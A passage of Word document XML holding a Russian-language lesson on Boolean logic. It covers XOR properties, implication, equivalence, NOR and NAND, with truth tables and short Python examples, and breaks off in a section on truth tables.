        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>XOR используется в проходных выключателях (управление светом с двух мест)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В криптографии для шифрования данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для проверки чётности в системах передачи данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Свойства XOR:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Коммутативность:** A ⊕ B = B ⊕ A</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ассоциативность:** (A ⊕ B) ⊕ C = A ⊕ (B ⊕ C)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Нейтральный элемент:** A ⊕ 0 = A</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Самоинверсия:** A ⊕ A = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Обратимость:** A ⊕ B ⊕ B = A (применение XOR дважды с тем же значением отменяет операцию)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Производные логические операции</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Операция импликация (следование)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Импликация (следование, условие)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — бинарная операция, которая моделирует логическое следствие: "если A, то B".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обозначения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A → B (в математической логике)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A ⇒ B (альтернативная запись)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>IF A THEN B (в программировании)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица истинности для импликации:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| A | B | A → B |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|-------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 0 | 1     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 1 | 1     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 0 | 0     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 1 | 1     |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Смысл:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> импликация ложна </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>только</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в случае, когда из истинной посылки (A=1) следует ложное заключение (B=0). Во всех остальных случаях импликация истинна.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Компоненты импликации:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**A** — посылка (антецедент, условие)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**B** — заключение (консеквент, следствие)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Словесные формулировки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Если A, то B"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Из A следует B"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"A влечёт B"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"A достаточно для B"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"B необходимо для A"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A → B: "Если идёт дождь (A), то асфальт мокрый (B)"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Разбор по случаям:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>A=0, B=0: "Не идёт дождь, асфальт сухой" → импликация истинна (1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>A=0, B=1: "Не идёт дождь, но асфальт мокрый" → импликация истинна (1) — может быть мокрым по другой причине</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>A=1, B=0: "Идёт дождь, но асфальт сухой" → импликация ложна (0) — противоречие!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>A=1, B=1: "Идёт дождь, асфальт мокрый" → импликация истинна (1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>"Если число делится на 4 (A), то оно чётное (B)" — эта импликация всегда истинна.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важное замечание:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Импликация может быть непривычной для начинающих. Главное понять: импликация означает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>обещание</w:t>
      </w:r>
      <w:r>
        <w:t>, которое нарушается только если из истинного A получается ложное B.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выражение через базовые операции:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A → B = ¬A ∨ B</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Это означает: "Либо A не выполнено, либо B выполнено" (или оба).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В программировании:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def implies(A, B):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return (not A) or B</w:t>
        <w:br/>
        <w:br/>
        <w:t># Пример:</w:t>
        <w:br/>
        <w:t>rain = True</w:t>
        <w:br/>
        <w:t>wet_asphalt = True</w:t>
        <w:br/>
        <w:t>implication = implies(rain, wet_asphalt)  # True</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типичные ошибки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Путают A → B и B → A (это разные высказывания!)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A → B не означает, что B является следствием только A</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Операция эквивалентность (равнозначность)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эквивалентность (равнозначность, двойная импликация)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — бинарная операция, результат которой истинен, когда оба операнда имеют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>одинаковые</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> значения.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обозначения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A ↔ B (в математической логике)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A ≡ B (альтернативная запись)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A ⇔ B (ещё одна запись)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A == B (в программировании, операция сравнения)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица истинности для эквивалентности:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| A | B | A ↔ B |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|-------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 0 | 1     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 1 | 0     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 0 | 0     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 1 | 1     |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Смысл:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> результат истинен (1), когда оба операнда </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>одинаковы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (оба истинны или оба ложны).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Словесные формулировки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"A эквивалентно B"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"A тогда и только тогда, когда B"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"A необходимо и достаточно для B"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"A равносильно B"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сравнение с XOR:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Эквивалентность — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>отрицание</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> XOR!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A ↔ B = ¬(A ⊕ B)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Операция      | A=B (одинаковы) | A≠B (различны) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---------------|-----------------|----------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| XOR (A ⊕ B)   | 0               | 1              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| EQV (A ↔ B)   | 1               | 0              |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">A ↔ B: "Число чётное (A) тогда и только тогда, когда оно делится на 2 (B)"  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Это истинное утверждение — оба свойства всегда совпадают.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">"Я сдам экзамен (A) тогда и только тогда, когда буду хорошо готовиться (B)"  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Эквивалентность означает: если готовлюсь — сдам, если не готовлюсь — не сдам.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выражение через базовые операции:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A ↔ B = (A → B) ∧ (B → A)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это означает: "если A, то B" </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>И</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> "если B, то A" (двойная импликация).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Также можно выразить как:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A ↔ B = (A ∧ B) ∨ (¬A ∧ ¬B)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это означает: "оба истинны" </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ИЛИ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> "оба ложны".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В программировании:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A = True</w:t>
        <w:br/>
        <w:t>B = True</w:t>
        <w:br/>
        <w:t>equivalence = (A == B)  # True</w:t>
        <w:br/>
        <w:br/>
        <w:t># Или через логические операции:</w:t>
        <w:br/>
        <w:t>equivalence = (A and B) or (not A and not B)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Операция стрелка Пирса (NOR)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стрелка Пирса (NOR, ИЛИ-НЕ)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — бинарная операция, результат которой истинен только когда оба операнда ложны.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обозначения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A ↓ B (стрелка Пирса)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A NOR B</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица истинности:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| A | B | A ↓ B |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|-------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 0 | 1     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 1 | 0     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 0 | 0     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 1 | 0     |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Смысл:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> результат истинен только когда </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>оба</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> операнда ложны.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выражение через базовые операции:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A ↓ B = ¬(A ∨ B)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Это отрицание дизъюнкции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенность:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> NOR — функционально полная операция. Это означает, что все остальные логические операции можно выразить только через NOR.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Операция штрих Шеффера (NAND)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Штрих Шеффера (NAND, И-НЕ)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — бинарная операция, результат которой ложен только когда оба операнда истинны.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Обозначения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A | B (штрих Шеффера)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A NAND B</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A ↑ B (альтернативная запись)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица истинности:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| A | B | A | B |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---|---|-------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 0 | 1     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 0 | 1 | 1     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 0 | 1     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1 | 1 | 0     |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Смысл:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> результат ложен только когда </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>оба</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> операнда истинны.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выражение через базовые операции:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A | B = ¬(A ∧ B)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Это отрицание конъюнкции.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Особенность:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> NAND — также функционально полная операция. В микроэлектронике элементы NAND очень популярны, так как проще в реализации, чем другие логические элементы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение в технике:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Практически все современные процессоры построены на базе транзисторов, реализующих операцию NAND. Из элементов NAND можно построить любую логическую схему.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Таблицы истинности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Понятие таблицы истинности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица истинности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это таблица, которая показывает результат логической операции или логического выражения для всех возможных комбинаций значений входных переменных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Назначение таблиц истинности:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Определение логической функции через перечисление всех возможных случаев</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Проверка эквивалентности двух логических выражений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Анализ сложных логических схем</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Доказательство логических законов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура таблицы истинности:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Столбцы для входных переменных (A, B, C, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Столбец для результата логической операции или выражения</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Строки для всех возможных комбинаций входных значений</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Количество строк в таблице:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Если у нас есть n переменных, то количество возможных комбинаций значений равно 2ⁿ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1 переменная → 2¹ = 2 строки (0, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2 переменные → 2² = 4 строки (00, 01, 10, 11)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>3 переменные → 2³ = 8 строк (000, 001, 010, 011, 100, 101, 110, 111)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
